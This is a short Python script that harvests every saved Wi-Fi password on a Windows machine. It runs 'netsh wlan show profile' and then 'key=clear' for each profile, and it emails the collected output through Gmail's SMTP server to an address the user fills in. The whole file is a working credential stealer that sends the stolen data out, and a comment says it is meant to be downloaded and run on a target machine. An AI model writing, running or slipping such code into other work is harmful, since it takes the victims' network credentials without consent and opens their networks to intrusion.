#! /usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# TODO: test it on physical Windows machine -- just download it and run it.
command_display_networks = "netsh wlan show profile"
networks = subprocess.check_output(command_display_networks, shell=True)
network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

networks_data_list = []
for network_name in network_names_list:
    command_show_password = "netsh wlan show profile " + network_name + " key=clear"
    current_network_data = subprocess.check_output(command_show_password, shell=True)
    networks_data_list.append(current_network_data)

send_mail("example@gmail.com", "password", "".join(networks_data_list))  # fill with necessary data for it to work
